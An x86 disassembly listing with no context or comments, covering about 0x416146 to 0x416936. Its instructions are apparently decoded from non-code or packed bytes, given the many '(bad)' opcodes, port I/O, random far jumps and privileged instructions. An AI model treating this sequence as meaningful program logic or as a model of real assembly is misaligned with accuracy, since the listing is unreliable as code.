  416146:	retf   
  416147:	lock jae 0x4160d5
  41614a:	mov    bl,0x65
  41614c:	rol    DWORD PTR [esi-0x2effa47],1
  416152:	pusha  
  416153:	popa   
  416154:	adc    eax,DWORD PTR [eax+0x75]
  416157:	js     0x4161b5
  416159:	aaa    
  41615a:	fwait
  41615b:	popa   
  41615c:	not    BYTE PTR [ebx+0x48]
  41615f:	js     0x4161cf
  416161:	aaa    
  416162:	mov    ebx,DWORD PTR [ebx]
  416164:	cmp    eax,0x822ee55
  416169:	mov    eax,ebx
  41616b:	out    0x3f,eax
  41616d:	mov    eax,0x6a2b1575
  416172:	jne    0x4160f8
  416174:	cmp    BYTE PTR [eax+0x111d55c2],bh
  41617a:	xor    eax,0xfec08669
  41617f:	and    cl,BYTE PTR [eax]
  416181:	jae    0x41610a
  416183:	add    ah,BYTE PTR [esi+0x38]
  416186:	fnstsw WORD PTR [edx-0xc]
  416189:	pop    es
  41618a:	test   dl,al
  41618c:	out    0x8c,al
  41618e:	add    BYTE PTR [eax],al
  416190:	add    BYTE PTR [eax],al
  416192:	add    BYTE PTR [ebx],bh
  416194:	push   es
  416195:	push   0x28
  416197:	int    0x1
  416199:	push   edx
  41619a:	or     esp,ebp
  41619c:	or     eax,0x9a698b7f
  4161a1:	stos   BYTE PTR es:[edi],al
  4161a2:	(bad)  
  4161a3:	lods   eax,DWORD PTR ds:[esi]
  4161a4:	sub    BYTE PTR [ecx+0x58bc846],bh
  4161aa:	lea    ebp,[esp+eax*2]
  4161ad:	or     BYTE PTR [esi],al
  4161af:	hlt    
  4161b0:	inc    eax
  4161b1:	jmp    0x41621e
  4161b3:	and    BYTE PTR [ecx],dh
  4161b5:	call   0x7bbb0fbd
  4161ba:	daa    
  4161bb:	ins    DWORD PTR es:[edi],dx
  4161bc:	jns    0x416192
  4161be:	pop    ds
  4161bf:	addr16 ret 0xe1e6
  4161c3:	int    0xdb
  4161c5:	sub    edi,edx
  4161c7:	std    
  4161c8:	data16 cmp bl,dl
  4161cb:	lds    eax,FWORD PTR [edi-0x2d3cefda]
  4161d1:	pop    edi
  4161d2:	(bad)  
  4161d3:	or     bh,BYTE PTR [edx-0xc]
  4161d6:	sbb    esp,DWORD PTR [edi-0x3e]
  4161d9:	out    0x34,al
  4161db:	sbb    al,0x3c
  4161dd:	push   ds
  4161de:	or     al,0x68
  4161e0:	jg     0x416247
  4161e2:	add    esi,DWORD PTR [ebp+0x2]
  4161e5:	lock fidivr WORD PTR [esi+0x9]
  4161e9:	imul   eax,DWORD PTR [esi-0x7318fd8b],0x68
  4161f0:	xchg   DWORD PTR [esi],ebx
  4161f2:	or     dh,bh
  4161f4:	push   es
  4161f5:	pop    esp
  4161f6:	pop    es
  4161f7:	add    BYTE PTR [eax],al
  4161f9:	add    BYTE PTR [eax],al
  4161fb:	add    BYTE PTR [ebp+0x2],dh
  4161fe:	out    0x8a,eax
  416200:	inc    esi
  416201:	jbe    0x416192
  416203:	out    0x80,eax
  416205:	add    eax,DWORD PTR [eax]
  416207:	jmp    0xfcb5a506
  41620c:	shr    ebx,0x3
  41620f:	stos   WORD PTR es:[edi],ax
  416211:	or     ebp,edi
  416213:	aam    0x6a
  416215:	ja     0x41628a
  416217:	loope  0x4161c2
  416219:	jbe    0x41622e
  41621b:	ins    DWORD PTR es:[edi],dx
  41621c:	pusha  
  41621d:	ret    0x71ff
  416220:	push   es
  416221:	cmp    esi,ecx
  416223:	mov    ch,0x46
  416225:	xor    DWORD PTR [ebx-0x23],ebx
  416228:	push   0x3b
  41622a:	push   0xffffffeb
  41622c:	inc    ecx
  41622d:	sar    ah,cl
  41622f:	pushf  
  416230:	mov    ch,ah
  416232:	cld    
  416233:	mov    bh,0x48
  416235:	jbe    0x416234
  416237:	cld    
  416238:	add    cl,BYTE PTR [ecx]
  41623a:	inc    eax
  41623b:	jmp    0xcdb4a433
  416240:	cmc    
  416241:	adc    al,0xc
  416243:	fidiv  DWORD PTR [esi]
  416245:	jns    0x416294
  416247:	lahf   
  416248:	cmc    
  416249:	adc    al,0xf8
  41624b:	fnstenv [esi]
  41624d:	jns    0x4162a2
  41624f:	out    0x7c,al
  416251:	(bad)  
  416252:	adc    BYTE PTR [ecx],ch
  416254:	jno    0x4161e1
  416256:	or     eax,0xbf7d0c62
  41625b:	enter  0x6a77,0xa
  41625f:	inc    DWORD PTR [eax]
  416261:	add    BYTE PTR [eax],al
  416263:	add    BYTE PTR [eax],al
  416265:	jns    0x416269
  416267:	jmp    0x89405240
  41626c:	and    al,0xf5
  41626e:	mov    al,BYTE PTR [edi]
  416270:	pusha  
  416271:	lods   eax,DWORD PTR ds:[esi]
  416272:	stc    
  416273:	cld    
  416274:	out    dx,al
  416275:	enter  0x1375,0x69
  416279:	xchg   edx,eax
  41627b:	call   FWORD PTR [ecx+0x78]
  41627e:	ja     0x4162f3
  416280:	xchg   ecx,eax
  416281:	dec    edx
  416282:	adc    eax,0x449e001c
  416287:	std    
  416288:	pop    ebp
  416289:	inc    esi
  41628a:	lds    edx,FWORD PTR [esi-0x37]
  41628d:	fimul  WORD PTR ds:0x8d8f5100
  416293:	sbb    DWORD PTR [eax],ebx
  416295:	sahf   
  416296:	inc    esp
  416297:	std    
  416298:	push   esp
  416299:	jecxz  0x41622c
  41629b:	jle    0x4162a9
  41629d:	shl    edi,cl
  41629f:	into   
  4162a0:	call   edx
  4162a2:	or     al,0x53
  4162a4:	jmp    DWORD PTR [ecx-0x73bfede8]
  4162aa:	xor    ebp,ecx
  4162ac:	(bad)  
  4162ad:	and    BYTE PTR [eax],ah
  4162af:	or     eax,DWORD PTR [ecx]
  4162b1:	gs es jbe 0x4162e5
  4162b5:	out    0x0,eax
  4162b7:	daa    
  4162b8:	(bad)
  4162bb:	aas    
  4162bc:	jb     0x41631d
  4162be:	push   0x3d
  4162c0:	pop    eax
  4162c1:	xlat   BYTE PTR ds:[ebx]
  4162c2:	dec    eax
  4162c3:	add    DWORD PTR [edx+0x7b],ebp
  4162c6:	ins    BYTE PTR es:[edi],dx
  4162c7:	dec    BYTE PTR [eax+eax*1+0x0]
  4162ce:	dec    eax
  4162cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162d0:	dec    ebp
  4162d1:	push   eax
  4162d2:	sub    ebx,DWORD PTR [ebx]
  4162d4:	cld    
  4162d5:	adc    ah,bl
  4162d7:	add    eax,DWORD PTR [ecx+0x7f05c1c0]
  4162dd:	lds    ecx,FWORD PTR [ebx+edi*1+0x2e]
  4162e1:	jb     0x4162b6
  4162e3:	in     al,dx
  4162e4:	add    dh,al
  4162e6:	push   eax
  4162e7:	sub    cl,BYTE PTR [ebx]
  4162e9:	add    BYTE PTR [ebx-0x9],ah
  4162ec:	into   
  4162ed:	dec    DWORD PTR [edx+0x6]
  4162f0:	push   ebx
  4162f1:	call   ecx
  4162f3:	pop    ss
  4162f4:	adc    al,BYTE PTR [eax-0x24]
  4162f7:	mov    DWORD PTR [esp-0x15],eax
  4162fb:	pop    eax
  4162fc:	pop    edx
  4162fd:	pop    ebx
  4162fe:	xor    eax,0x7535fac3
  416303:	popa   
  416304:	dec    ebp
  416305:	inc    ecx
  416306:	jne    0x416289
  416308:	sub    esi,DWORD PTR [esi]
  41630a:	je     0x416375
  41630c:	xor    al,al
  41630e:	push   ss
  41630f:	jb     0x41635e
  416311:	inc    ecx
  416312:	jne    0x4162e0
  416314:	or     al,0xcc
  416316:	imul   esp,DWORD PTR ss:[edx+0x1acb114],0x6cf440c1
  416321:	and    DWORD PTR [ecx-0x6ab474fb],0xec07cfe4
  41632b:	scas   al,BYTE PTR es:[edi]
  41632c:	mov    DWORD PTR gs:[eax],ebp
  41632f:	mov    WORD PTR gs:[ebx+0x0],cs
  416333:	add    BYTE PTR [eax],al
  416335:	add    BYTE PTR [eax],al
  416337:	pop    ebp
  416338:	in     al,0xcf
  41633a:	paddb  mm2,QWORD PTR [ebp+0x6a2d816d]
  416341:	nop
  416342:	dec    ebx
  416343:	cmp    DWORD PTR [edi+0x46],edi
  416346:	inc    ebx
  416347:	xor    DWORD PTR [edi+eiz*1-0x79],ecx
  41634b:	mov    al,0x11
  41634d:	imul   ebp,DWORD PTR [edx+ebx*4],0x37c7016a
  416354:	add    DWORD PTR gs:[ebx-0x2],edx
  416358:	cld    
  416359:	sub    esp,0xefe7ec81
  41635f:	jne    0x41634d
  416361:	cld    
  416362:	or     ebp,DWORD PTR [ebp+0x2f]
  416365:	ror    DWORD PTR [eax+0x43436190],cl
  41636b:	or     ch,BYTE PTR [ecx-0xa]
  41636e:	sbb    al,0xee
  416370:	daa    
  416371:	adc    BYTE PTR [ecx-0x7cfbbe70],al
  416377:	mov    ch,0x34
  416379:	sbb    BYTE PTR [ecx+0x7388613a],cl
  41637f:	fld    QWORD PTR [ecx]
  416381:	addr16 inc eax
  416383:	mov    bh,BYTE PTR [ebx]
  416385:	adc    ecx,DWORD PTR [eax+edx*8]
  416388:	mov    esp,0x7a363b8e
  41638d:	sbb    DWORD PTR [ebp-0x14],ebp
  416390:	in     al,dx
  416391:	(bad)  
  416392:	mov    ah,BYTE PTR [esi]
  416394:	outs   dx,BYTE PTR ds:[esi]
  416395:	push   0x7a
  416397:	add    DWORD PTR [edi],0xf69
  41639d:	add    BYTE PTR [eax],al
  41639f:	add    BYTE PTR [edx+0x7b88e776],ch
  4163a5:	sbb    DWORD PTR [edi+0x10],0x68
  4163a9:	test   BYTE PTR [esp+eax*1+0x75],dl
  4163ad:	add    dl,BYTE PTR [edx]
  4163af:	mov    DWORD PTR [esi+0x75706606],0x2b88e702
  4163b9:	(bad)  
  4163ba:	arpl   di,cx
  4163bc:	jle    0x4163c3
  4163be:	imul   ecx,DWORD PTR [ebp+0x75],0x2
  4163c2:	out    0x74,eax
  4163c4:	and    al,BYTE PTR [ebx]
  4163c6:	out    0x3,eax
  4163c8:	xor    eax,0x75416306
  4163cd:	add    ah,bh
  4163cf:	or     esi,0x75
  4163d2:	out    0xf7,eax
  4163d4:	outs   dx,BYTE PTR ds:[esi]
  4163d5:	ins    DWORD PTR es:[edi],dx
  4163d6:	sub    BYTE PTR [esi*2-0x6f358fe],al
  4163dd:	mov    bl,0xe7
  4163df:	add    esi,DWORD PTR [ebp-0x77]
  4163e2:	sbb    BYTE PTR [ebx+0x3e70317],al
  4163e8:	cmc    
  4163e9:	out    dx,al
  4163ea:	jmp    0x62b41a6b
  4163ef:	(bad)  
  4163f0:	jle    0x4163bc
  4163f2:	push   edx
  4163f3:	int3   
  4163f4:	mov    edx,0xb2cc03ee
  4163f9:	out    dx,al
  4163fa:	test   DWORD PTR [eax+0x3cfffedd],0xe1e8839d
  416404:	add    BYTE PTR [eax],al
  416406:	add    BYTE PTR [eax],al
  416408:	add    dl,ch
  41640a:	push   cs
  41640b:	adc    DWORD PTR [ecx+0x65830786],0x48000276
  416415:	inc    si
  416417:	inc    ecx
  416418:	jmp    0xfc49209a
  41641d:	mov    esp,0xa692d280
  416422:	mov    al,BYTE PTR [ebp-0x27]
  416425:	std    
  416426:	(bad)  
  416427:	adc    eax,DWORD PTR [edx-0xeba74a1]
  41642d:	in     eax,dx
  41642e:	leave  
  41642f:	not    DWORD PTR [edx+0x47]
  416432:	mov    eax,DWORD PTR [ecx+0xd]
  416435:	cld    
  416436:	retf   
  416437:	daa    
  416438:	inc    edx
  416439:	dec    edi
  41643a:	mov    eax,DWORD PTR [ecx-0x27]
  41643d:	in     eax,dx
  41643e:	retf   
  41643f:	adc    edx,DWORD PTR [edx-0x69]
  416442:	mov    BYTE PTR [ecx-0x2f],al
  416445:	repnz inc ecx
  416447:	jae    0x41642a
  416449:	jmp    0x773a6503
  41644e:	add    dh,BYTE PTR [ebx-0x13]
  416451:	xchg   edx,eax
  416452:	jne    0x4164c8
  416454:	stos   BYTE PTR es:[edi],al
  416455:	shl    DWORD PTR [ebp+0x276c900],0x74
  41645c:	ret    0xc2ed
  41645f:	pop    es
  416460:	jb     0x41649f
  416462:	or     DWORD PTR [ecx+0xc77f5df],ecx
  416468:	jne    0x4164c1
  41646a:	cmp    edx,0xfffffffd
  41646d:	add    BYTE PTR [eax],al
  41646f:	add    BYTE PTR [eax],al
  416471:	add    BYTE PTR [esp+ebx*1],ah
  416474:	sub    DWORD PTR [ebx-0x6a9d27b],0x394f1405
  41647e:	in     al,dx
  41647f:	mov    ebx,0x2d5c000b
  416484:	sti    
  416485:	call   0x4138f8
  41648a:	push   edi
  41648b:	jnp    0x416492
  41648d:	test   DWORD PTR [esi+esi*2],ecx
  416490:	or     dh,bh
  416492:	mov    al,BYTE PTR [edx]
  416494:	add    BYTE PTR [eax],al
  416496:	fadd   QWORD PTR [eax+0x431a2b74]
  41649c:	cld    
  41649d:	add    DWORD PTR [edi+0x0],edx
  4164a0:	and    eax,0xeffd3845
  4164a5:	xor    DWORD PTR [ecx+0x1f0f0be4],0xfffffffe
  4164ac:	cli    
  4164ad:	call   DWORD PTR [ebx]
  4164af:	jle    0x41652a
  4164b1:	dec    DWORD PTR [ecx+esi*2+0x375c3304]
  4164b8:	inc    ecx
  4164b9:	lock test eax,0xccc02efb
  4164bf:	push   edi
  4164c0:	pop    ebx
  4164c1:	leave  
  4164c2:	dec    esi
  4164c3:	or     al,BYTE PTR [eax]
  4164c5:	xor    bl,BYTE PTR [ebx+eiz*8-0x1528aa0b]
  4164cc:	jl     0x4164ba
  4164ce:	add    al,0x3
  4164d0:	add    BYTE PTR [eax],al
  4164d2:	pop    ds
  4164d3:	push   edx
  4164d4:	push   esp
  4164d5:	mov    eax,DWORD PTR [eax]
  4164d7:	add    BYTE PTR [eax],al
  4164d9:	add    BYTE PTR [eax],al
  4164db:	icebp  
  4164dc:	pop    es
  4164dd:	xchg   DWORD PTR [edi+0x1c],eax
  4164e0:	add    eax,0x75
  4164e3:	pop    ebx
  4164e4:	cs shr cl,0xf5
  4164e8:	jae    0x4164e7
  4164ea:	inc    DWORD PTR [eax+eax*1]
  4164ed:	add    BYTE PTR [eax],al
  4164ef:	dec    esp
  4164f0:	push   0xc55ef
  4164f5:	push   eax
  4164f6:	lea    esi,[ecx-0x41771816]
  4164fc:	(bad)  
  4164fd:	dec    DWORD PTR [eax-0x7c47d98b]
  416503:	xor    eax,0x788158ce
  416508:	dec    ebp
  416509:	or     DWORD PTR [edi-0x7df5aec8],eax
  41650f:	xor    al,0x65
  416511:	add    DWORD PTR [eax],eax
  416513:	into   
  416514:	push   0xf0cd438e
  416519:	or     BYTE PTR [ecx-0x7df58e34],al
  41651f:	test   BYTE PTR [ebp+0x1],ah
  416522:	add    BYTE PTR [esi+0x16],bh
  416525:	push   0xfd51f20d
  41652a:	push   DWORD PTR [edx+0x450840e8]
  416530:	loopne 0x4165a5
  416532:	adc    DWORD PTR [ebx+0xf1feb61],0xfed68e69
  41653c:	xor    al,0x8c
  41653e:	jae    0x416540
  416540:	add    BYTE PTR [eax],al
  416542:	add    BYTE PTR [eax],al
  416544:	xchg   ebp,eax
  416545:	loop   0x416506
  416547:	jecxz  0x4164d6
  416549:	sti    
  41654a:	jns    0x416549
  41654c:	jp     0x416533
  41654e:	inc    eax
  41654f:	or     eax,0x67df9
  416554:	jne    0x416582
  416556:	lock jecxz 0x416547
  416559:	or     ch,bl
  41655b:	dec    ah
  41655d:	imul   ebp,DWORD PTR [ecx+0x10],0x847a1453
  416564:	xor    eax,0x768d7d5c
  416569:	imul   eax,DWORD PTR [ecx],0x8e05c0fd
  41656f:	(bad)  
  416570:	lahf   
  416571:	addr16 jmp 0x416573
  416574:	adc    ch,BYTE PTR [edi+0x75]
  416577:	std    
  416578:	and    bl,ch
  41657a:	inc    eax
  41657b:	or     eax,0x56001f1
  416580:	jne    0x416584
  416582:	fsubp  st(7),st
  416584:	push   ss
  416585:	xchg   DWORD PTR [ebp-0x19178912],edi
  41658b:	imul   edx,DWORD PTR [ecx],0x75
  41658e:	(bad)  
  41658f:	jns    0x41658a
  416591:	inc    ecx
  416592:	out    dx,al
  416593:	jg     0x4165e9
  416595:	jmp    esi
  416597:	add    ebp,esp
  416599:	rcr    dl,cl
  41659b:	mov    WORD PTR [eax],?
  41659d:	or     dh,BYTE PTR [eax-0x41]
  4165a0:	(bad)  
  4165a1:	jl     0x416565
  4165a3:	sti    
  4165a4:	jge    0x416578
  4165a6:	xchg   ebp,eax
  4165a7:	sldt   WORD PTR [eax]
  4165aa:	add    BYTE PTR [eax],al
  4165ac:	add    BYTE PTR [ecx-0x13fbd8f1],bh
  4165b2:	pop    ecx
  4165b3:	ins    BYTE PTR es:[edi],dx
  4165b4:	pop    ebp
  4165b5:	xor    ebp,DWORD PTR [ebx]
  4165b7:	ins    BYTE PTR es:[edi],dx
  4165b8:	mov    edi,0x3500d1ba
  4165bd:	lea    edx,[edi-0x796786fc]
  4165c3:	mov    ah,0x53
  4165c5:	hlt    
  4165c6:	fsubr  QWORD PTR [edx]
  4165c8:	add    al,0xf2
  4165ca:	les    ebp,FWORD PTR [edx]
  4165cc:	shr    ebp,cl
  4165ce:	dec    ecx
  4165cf:	and    eax,0x7001babf
  4165d4:	mov    edi,0xe80b5b3a
  4165d9:	imul   esi,DWORD PTR [edx+0x6b],0x2b877044
  4165e0:	add    al,0x75
  4165e2:	add    dh,BYTE PTR [edi+ebp*8+0x12]
  4165e6:	pop    ebx
  4165e7:	out    0xe7,eax
  4165e9:	dec    ecx
  4165ea:	jb     0x41664e
  4165ec:	out    dx,eax
  4165ed:	and    bh,BYTE PTR [esi-0x54]
  4165f0:	pop    edi
  4165f1:	xor    ecx,eax
  4165f3:	add    DWORD PTR [ebx+edi*1],eax
  4165f6:	enter  0x3f9,0xf2
  4165fa:	idiv   edi
  4165fc:	cld    
  4165fd:	stc    
  4165fe:	jo     0x41660c
  416600:	fdivrp st(0),st
  416602:	and    eax,0x7b76e902
  416607:	add    DWORD PTR [edx-0x72],ebp
  41660a:	dec    BYTE PTR [ebx+ebp*2]
  41660d:	pusha  
  41660e:	add    al,0x0
  416610:	jmp    0x416615
  416615:	add    BYTE PTR [ecx],bh
  416617:	(bad)
  41661a:	cmc    
  41661b:	add    DWORD PTR [edx],eax
  41661d:	jmp    0xed8ae198
  416622:	gs mov cl,0x0
  416625:	jmp    0x6d4e88a0
  41662a:	inc    edi
  41662b:	jno    0x41662a
  41662d:	jmp    0xe64dd123
  416632:	hlt    
  416633:	pop    edx
  416634:	(bad)  
  416635:	call   0xe900deb0
  41663a:	jge    0x4165c2
  41663c:	fucomp st(0)
  41663e:	jbe    0x416642
  416640:	mov    ch,BYTE PTR [esi]
  416642:	add    DWORD PTR [esi+0x776ef4c0],0x266e9bf
  41664c:	add    ah,dl
  41664e:	jp     0x41667e
  416650:	jmp    ebp
  416652:	add    edi,DWORD PTR [edx]
  416654:	(bad)  
  416655:	call   0xea00ddd0
  41665a:	xchg   esi,eax
  41665b:	add    al,BYTE PTR [eax]
  41665d:	out    dx,al
  41665e:	jmp    0x7b82:0x76e8ffae
  416665:	cmp    dh,BYTE PTR [esi-0x1]
  416668:	sbb    BYTE PTR [edi],0x76
  41666b:	add    al,BYTE PTR [eax]
  41666d:	xchg   ebx,eax
  41666e:	jno    0x41663f
  416670:	mov    bl,BYTE PTR [esp+ecx*1+0x6c]
  416674:	std    
  416675:	push   cs
  416676:	into   
  416677:	js     0x41665b
  416679:	add    BYTE PTR [eax],al
  41667b:	add    BYTE PTR [eax],al
  41667d:	add    BYTE PTR [eax],al
  41667f:	jnp    0x41666b
  416681:	xchg   al,dh
  416683:	test   BYTE PTR [ebx],dl
  416685:	ins    DWORD PTR es:[edi],dx
  416686:	add    DWORD PTR [ecx+edi*1],ecx
  416689:	add    al,0x73
  41668b:	maxps  xmm7,xmm7
  41668e:	pop    esi
  41668f:	mov    eax,esi
  416691:	rol    DWORD PTR [ecx],1
  416693:	sbb    al,0x5
  416695:	push   0x14
  416697:	cmp    al,0x5c
  416699:	std    
  41669a:	mov    ecx,fs
  41669c:	pop    ebp
  41669d:	cld    
  41669e:	(bad)  
  41669f:	mov    ebx,0xc4ffc884
  4166a4:	cwde   
  4166a5:	sbb    BYTE PTR [ecx],al
  4166a7:	int3   
  4166a8:	add    eax,0x8c3a0f
  4166ae:	add    ah,bl
  4166b0:	cmp    ebx,0x2
  4166b3:	popa   
  4166b4:	inc    eax
  4166b5:	mov    dh,BYTE PTR [ebp-0x50674]
  4166bb:	and    al,0xa0
  4166bd:	add    BYTE PTR [eax],al
  4166bf:	pushf  
  4166c0:	fdivr  st(2),st
  4166c2:	mov    eax,0x8589049c
  4166c7:	je     0x4166c2
  4166c9:	cli    
  4166ca:	(bad)  
  4166cb:	jl     0x41674a
  4166cd:	(bad)  
  4166ce:	push   eax
  4166cf:	daa    
  4166d0:	bound  edx,QWORD PTR [eax-0x1]
  4166d3:	mov    eax,ds:0x81ff55e0
  4166d8:	xor    BYTE PTR [edx],dl
  4166da:	inc    eax
  4166db:	mov    WORD PTR [edi+eiz*2+0x8],ss
  4166df:	adc    al,0x7d
  4166e1:	into   
  4166e2:	call   0x4166e7
  4166e7:	add    BYTE PTR [edi-0x8],al
  4166ea:	cli    
  4166eb:	call   eax
  4166ed:	(bad)  
  4166ee:	jo     0x416703
  4166f0:	mov    ecx,0xa4e8bd41
  4166f5:	pop    ebx
  4166f6:	cld    
  4166f7:	inc    edi
  4166f9:	test   BYTE PTR [eax+0x598e75f6],0xe7
  416700:	inc    esp
  416701:	add    BYTE PTR [ebp-0x3],dh
  416704:	add    bh,ch
  416706:	inc    eax
  416707:	call   0xfdb7fb30
  41670c:	or     al,0x5b
  41670e:	(bad)  
  41670f:	push   DWORD PTR [ebp-0x24]
  416712:	je     0x416715
  416714:	mov    BYTE PTR [edi+eax*4],al
  416717:	mov    bl,0xd1
  416719:	dec    edi
  41671a:	jbe    0x416719
  41671c:	mov    ebp,0x75000190
  416721:	inc    ecx
  416722:	xchg   ebp,eax
  416723:	mov    eax,0x83885975
  416728:	pop    ebp
  416729:	mov    al,0x76
  41672b:	std    
  41672c:	inc    ebp
  41672d:	in     al,0x3a
  41672f:	jmp    0x68c1364a
  416734:	shr    BYTE PTR [eax+0x16ca5076],cl
  41673a:	or     al,0x8b
  41673c:	clc    
  41673d:	cmc    
  41673e:	je     0x41673d
  416740:	mov    edx,0x26f06c29
  416745:	pop    ecx
  416746:	add    DWORD PTR [ebx-0x3f6f9f4b],eax
  41674c:	add    BYTE PTR [eax],al
  41674e:	add    BYTE PTR [eax],al
  416750:	add    cl,bh
  416752:	cdq    
  416753:	lock push es
  416755:	cwd    
  416757:	fild   DWORD PTR [esi-0x28a7a08]
  41675d:	mov    ah,BYTE PTR [edx+0x5982ff63]
  416763:	mov    BYTE PTR [ebx-0x28a2c35],al
  416769:	cmp    ebx,DWORD PTR [ecx+0x1]
  41676c:	inc    eax
  41676d:	mov    esp,0xb8c67cb6
  416772:	sub    al,0x4
  416774:	mov    DWORD PTR [esi-0x24],esi
  416777:	push   0x7402a50c
  41677c:	ret    0xd27e
  41677f:	imul   edi,eax,0xfffffff2
  416782:	xor    ah,BYTE PTR [edi]
  416784:	imul   ecx,DWORD PTR [edi-0x6fc1831],0x41
  41678b:	idiv   BYTE PTR [edi-0xf]
  41678e:	add    bh,ah
  416790:	add    esp,DWORD PTR [edi+ebp*2+0x64]
  416794:	mov    BYTE PTR [ecx],ah
  416796:	jo     0x416786
  416798:	jne    0x4167de
  41679a:	js     0x41680d
  41679c:	rol    BYTE PTR [edi-0x6e],0xcf
  4167a0:	adc    BYTE PTR [edx+0x1],ch
  4167a3:	out    0xbd,eax
  4167a5:	cmc    
  4167a6:	inc    eax
  4167a7:	jecxz  0x416729
  4167a9:	repz adc DWORD PTR [ecx],edi
  4167ac:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167ae:	inc    edx
  4167af:	inc    ebp
  4167b0:	mov    esp,edx
  4167b2:	jge    0x4167d8
  4167b4:	pop    eax
  4167b5:	add    BYTE PTR [eax],al
  4167b7:	add    BYTE PTR [eax],al
  4167b9:	add    BYTE PTR [edx],ch
  4167bb:	fsubr  st(7),st
  4167bd:	int3   
  4167be:	(bad)  
  4167bf:	jl     0x416744
  4167c1:	js     0x41678b
  4167c3:	outs   dx,BYTE PTR ds:[esi]
  4167c4:	pop    edi
  4167c5:	add    esi,DWORD PTR [ebp+0x2]
  4167c8:	shr    DWORD PTR [bp+si],cl
  4167cb:	inc    edi
  4167cc:	and    al,0x5c
  4167ce:	jns    0x4167d2
  4167d0:	out    0x3,eax
  4167d2:	repnz les ebx,FWORD PTR [edx+0x766eb381]
  4167d9:	mulps  xmm2,XMMWORD PTR [edx]
  4167dc:	daa    
  4167dd:	add    al,0xf6
  4167df:	inc    ecx
  4167e0:	fmul   st(1),st
  4167e2:	inc    esp
  4167e4:	ds aam 0xef
  4167e7:	les    ecx,FWORD PTR [esi+0x5bd721d4]
  4167ed:	jg     0x416858
  4167ef:	ins    DWORD PTR es:[edi],dx
  4167f0:	inc    esi
  4167f1:	jne    0x4167b8
  4167f3:	ins    DWORD PTR es:[edi],dx
  4167f4:	mov    ah,0x57
  4167f6:	pusha  
  4167f7:	sbb    BYTE PTR [eax],al
  4167f9:	icebp  
  4167fa:	xchg   dl,al
  4167fc:	jmp    FWORD PTR ds:0x29834a62
  416802:	jo     0x4167ca
  416804:	jb     0x416847
  416806:	enter  0x1c11,0xf9
  41680a:	outs   dx,BYTE PTR ss:[esi]
  41680c:	or     BYTE PTR [edi],0x75
  41680f:	icebp  
  416810:	sbb    eax,eax
  416812:	sub    eax,0x76650d06
  416817:	ins    DWORD PTR es:[edi],dx
  416818:	std    
  416819:	jmp    0xe8b23cac
  41681e:	add    BYTE PTR [eax],al
  416820:	add    BYTE PTR [eax],al
  416822:	add    BYTE PTR [esi+0x7b],dh
  416825:	dec    ecx
  416826:	icebp  
  416827:	jne    0x4167e2
  416829:	mov    bh,0x22
  41682b:	mov    cl,0xff
  41682d:	test   bh,al
  41682f:	jbe    0x416833
  416831:	add    BYTE PTR [edx-0x15],ah
  416834:	add    eax,0x44513c89
  416839:	inc    ebx
  41683a:	ret    0x7b77
  41683d:	add    DWORD PTR [eax],eax
  41683f:	sbb    dh,BYTE PTR [edx+0x1]
  416842:	xchg   ecx,eax
  416843:	cmc    
  416844:	jmp    0x83b35e3c
  416849:	fstp   DWORD PTR [ecx+ecx*2+0x492c896f]
  416850:	push   DWORD PTR [ecx+ebp*1-0x17001a4d]
  416857:	jbe    0x41681b
  416859:	dec    edi
  41685a:	jle    0x4167ed
  41685c:	sub    eax,0x5a45148b
  416861:	push   eax
  416862:	push   cs
  416863:	jns    0x416867
  416865:	mov    DWORD PTR [ecx],esi
  416867:	(bad)  
  416868:	mov    ecx,0xff2f64df
  41686d:	sbb    DWORD PTR [eax+0x62000276],0x4b
  416874:	push   ecx
  416875:	xor    DWORD PTR [eax],eax
  416877:	pushf  
  416878:	js     0x4168bb
  41687a:	hlt    
  41687b:	(bad)  
  41687c:	cld    
  41687d:	xchg   BYTE PTR [ecx],dl
  41687f:	iret   
  416880:	jmp    0x416887
  416882:	jb     0x4168c6
  416884:	sub    cl,bh
  416886:	ja     0x416888
  416888:	add    BYTE PTR [eax],al
  41688a:	add    BYTE PTR [eax],al
  41688c:	jbe    0x41686a
  41688e:	cmp    al,0x4
  416890:	dec    ebp
  416891:	pop    esp
  416892:	or     BYTE PTR [ebx],ch
  416894:	xchg   BYTE PTR [edx],al
  416896:	retf   0x8783
  416899:	outs   dx,DWORD PTR ds:[esi]
  41689a:	jo     0x416882
  41689c:	xchg   eax,edi
  41689e:	mov    BYTE PTR [ecx+0x1a],al
  4168a1:	js     0x4168e4
  4168a3:	hlt    
  4168a4:	xchg   ecx,eax
  4168a5:	inc    ebx
  4168a6:	idiv   edi
  4168a8:	mov    ebp,ebx
  4168aa:	cs leave 
  4168ac:	push   esp
  4168ad:	inc    ebx
  4168ae:	clc    
  4168af:	jns    0xec8eed7c
  4168b5:	int    0xc6
  4168b7:	sbb    ch,bl
  4168b9:	add    BYTE PTR [esi-0x1],dl
  4168bc:	test   eax,0xf84584da
  4168c1:	int    0x2e
  4168c3:	xor    ebp,ecx
  4168c5:	add    BYTE PTR [edi+0x48eebc4d],al
  4168cb:	mov    al,0x47
  4168cd:	inc    ebx
  4168ce:	shl    DWORD PTR [ebx],1
  4168d0:	mov    bh,0xee
  4168d2:	inc    eax
  4168d3:	test   al,0x55
  4168d5:	imul   ebp,DWORD PTR [ecx+0x35aa9189],0x5d
  4168dc:	cmp    BYTE PTR [ebx+0x2],ch
  4168df:	cmp    DWORD PTR [ecx-0x18fb8f16],eax
  4168e5:	ret    
  4168e6:	jo     0x4168f2
  4168e8:	xor    DWORD PTR [ebx-0x63],ebp
  4168eb:	call   0x417972
  4168f0:	add    BYTE PTR [eax],al
  4168f2:	add    BYTE PTR [eax],al
  4168f4:	add    BYTE PTR [edi],ah
  4168f6:	sub    DWORD PTR ds:0xf6cf755d,esi
  4168fc:	inc    esi
  4168fd:	dec    BYTE PTR [ebp+ebp*1+0xc32de3f]
  416904:	mov    ebp,edx
  416906:	add    DWORD PTR [ecx+eax*8-0x76],ebx
  41690a:	pop    edx
  41690b:	add    DWORD PTR [ebp+esi*1-0x4577174a],eax
  416912:	gs jle 0x4168d4
  416915:	into   
  416916:	sbb    DWORD PTR [ecx+eax*1],ecx
  416919:	jae    0x4168b5
  41691b:	jl     0x41696a
  41691d:	jno    0x41699e
  41691f:	or     DWORD PTR [ebx+0x4fd2b9b8],ecx
  416925:	or     eax,0x1aff33b9
  41692a:	add    DWORD PTR ds:0x7e619089,eax
  416930:	inc    ebx
  416931:	sbb    eax,0xb82700f1
  416936:	cmp    eax,0xd90d4304
